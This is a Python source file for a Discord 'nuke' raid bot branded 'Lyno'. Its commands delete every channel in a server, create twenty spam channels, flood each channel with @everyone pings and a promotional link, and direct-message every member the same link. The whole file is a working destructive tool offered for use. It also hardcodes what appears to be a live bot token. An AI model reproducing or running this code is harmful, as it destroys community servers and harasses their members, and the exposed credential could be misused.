"""
██╗     ██╗   ██╗███╗   ██╗ ██████╗     ███████╗ ██████╗ ██╗   ██╗██████╗  ██████╗███████╗
██║     ╚██╗ ██╔╝████╗  ██║██╔═══██╗    ██╔════╝██╔═══██╗██║   ██║██╔══██╗██╔════╝██╔════╝
██║      ╚████╔╝ ██╔██╗ ██║██║   ██║    ███████╗██║   ██║██║   ██║██████╔╝██║     █████╗  
██║       ╚██╔╝  ██║╚██╗██║██║   ██║    ╚════██║██║   ██║██║   ██║██╔══██╗██║     ██╔══╝  
███████╗   ██║   ██║ ╚████║╚██████╔╝    ███████║╚██████╔╝╚██████╔╝██║  ██║╚██████╗███████╗
╚══════╝   ╚═╝   ╚═╝  ╚═══╝ ╚═════╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝

                          > Never Skid It 
                          > https://dsc.gg/lyno
"""

import discord
from discord.ext import commands
# Change these index if you want

# YOUR BOT TOKEN ( get it at https://discord.com/developers/applications):
token = "MTE5MTI3MDYyMzcwODcyMTE4Mg.GVw9Eu.boGms9R2ERny-UFOtqL2tnod3LTnbNgSadP5tw"

twitch = "https://twitch.tv/LynoConfigs" # your twitch profile

# Pings do <@userid> for mention users
ping = "@everyone @here"

prefix = "." # Prefix , Example: .nuke

channelname = "raid by lynodestroyers"

spammsg = f"{ping} **LYNO WAS HERE** \n https://dsc.gg/lyno , Ain't No Way boi!"

# Don't Change These ( just igore these)




intents = discord.Intents.all()
lynodestroyer = commands.Bot(command_prefix=prefix, intents=intents)

# When Bot is Online...

@lynodestroyer.event
async def on_ready():
    await lynodestroyer.change_presence(activity=discord.Streaming(name="✅Lyno Nuke Bot | dsc.gg/lyno", url=twitch))
    print(f"Bot Is Online , Loggined As {lynodestroyer.user.name} , Lyno Is Active !")
    print(f"Commands : {prefix}nuke {prefix}delchan {prefix}createchan {prefix}ping")
    # it can be discord.Status.online , idle dnd streaming etc...
@lynodestroyer.command()
async def nuke(ctx):
    guild = ctx.guild
    channels = guild.channels
    user = ctx.author
    for channel in channels:
        await channel.delete()

    for _ in range(20):
        await guild.create_text_channel(name=channelname)

    for channel in guild.channels:
        await channel.send(spammsg)
    await user.send(f"{user.mention} Successfully Nuked The Server !")

    for member in guild.members:
        await member.send(f"{member.mention} https://dsc.gg/lyno = free bot")

@lynodestroyer.command()
async def delchan(ctx):
    guild = ctx.guild
    channels = guild.channels
    user = ctx.author
    for channel in guild.channels:
        await channel.delete()
    await user.send(f"{user.mention} Successfully Deleted All Channels !")

@lynodestroyer.command()
async def createchan(ctx):
    guild = ctx.guild
    user = ctx.author
    for _ in range(20):
        await guild.create_text_channel(name=channelname)
    await user.send(f"{user.mention} Successfully Created All Channels !")

@lynodestroyer.command()
async def ping(ctx):
    guild = ctx.guild
    user = ctx.author
    for channel in guild.channels:
        await channel.send(spammsg)
    await user.send(f"{user.mention} Successfully Spammed in Server !")



# Run it
lynodestroyer.run(token)
